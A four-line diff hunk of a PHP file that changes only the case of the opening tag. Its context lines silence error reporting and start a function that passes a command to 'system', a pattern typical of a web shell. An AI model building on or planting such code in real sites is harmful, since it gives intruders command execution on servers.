@@ -1,4 +1,4 @@
-<?pHp
+<?pHP
 error_reporting(0);
 function ekse($cmd) {
 	if(function_exists('system')) {
